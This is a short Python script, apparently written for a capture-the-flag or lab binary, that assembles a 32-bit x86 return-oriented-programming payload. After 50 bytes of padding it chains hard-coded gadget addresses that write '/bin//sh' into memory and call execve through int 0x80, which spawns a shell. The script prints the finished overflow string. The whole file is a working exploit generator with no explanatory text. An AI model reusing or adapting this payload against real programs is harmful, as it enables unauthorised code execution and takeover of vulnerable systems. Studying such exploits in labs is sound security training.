def hex_sum(hex_str1, hex_str2):
    num1 = int(hex_str1, 16)
    num2 = int(hex_str2, 16)
    sum_hex = hex(num1 + num2)
    if len(str(sum_hex).split('x')[1]) == 7:
        sum_hex = '0x0' + str(sum_hex).split('x')[1]
    return sum_hex

def string_to_hex(string):
    string = string[::-1]
    hexadecimal = '0x'
    for character in string:
        hexadecimal += str(hex(ord(character))).split('x')[1]
    return hexadecimal

def hex_to_xformat(hex_str):
    string = ''
    for i in range(2,len(hex_str)-1,2):
        string += f'\\x{hex_str[i]}{hex_str[i+1]}'
    return string

def calculate_length(stack):
    length = 0
    for element in stack:
        if element.__contains__('\\x'):
            length += len(element)//4
        else:
            length += len(element)
    return length

def reverse_address(address):
    new_address = '0x'
    # print(address.split('x')[1])
    for i in range(len(address.split('x')[1])-1,-1, -2):
        new_address += address.split('x')[1][i-1] + address.split('x')[1][i]
        # print(address.split('x')[1][i-1] + address.split('x')[1][i])
    # print(new_address)
    return new_address

g1 = reverse_address('0x070483e8') # pop %eax pop %ebx
g2 = reverse_address('0x070483eb') # xor %eax,%eax
g3 = reverse_address('0x070483ee') # mov %eax,(%ebx)
g4 = reverse_address('0x070483f1') # mov %eax,%ebx
g5 = reverse_address('0x070483f4') # xor %ecx,%ecx
g6 = reverse_address('0x070483f7') # xor %edx,%edx
g7 = reverse_address('0x070483fa') # mov $0xb,%al
g8 = reverse_address('0x070483fd') # int $0x80
data = '0x07048020'
data_reversed = reverse_address(data)
command_parts = ['/bin', '//sh']

data_pointer = data

stack = []
stack.append('A'*50)
stack.append(hex_to_xformat(g1))
for command in command_parts:
    command_hex = string_to_hex(command)
    stack.append(hex_to_xformat(reverse_address(command_hex)))
    stack.append(hex_to_xformat(data_reversed))
    stack.append(hex_to_xformat(g3))
    stack.append(hex_to_xformat(g1))
    data = hex_sum(data, '0x4')
    data_reversed = reverse_address(data)

stack.append('A'*4)
stack.append(hex_to_xformat(data_reversed))
stack.append(hex_to_xformat(g2))
stack.append(hex_to_xformat(g3))
stack.append(hex_to_xformat(g1))


stack.append(hex_to_xformat(reverse_address(data_pointer)))
stack.append('A'*4)
stack.append(hex_to_xformat(g4))
stack.append(hex_to_xformat(g2))
stack.append(hex_to_xformat(g5))
stack.append(hex_to_xformat(g6))
stack.append(hex_to_xformat(g7))
stack.append(hex_to_xformat(g8))

print(hex_to_xformat(g8))
print(calculate_length(stack))
print(''.join(stack))
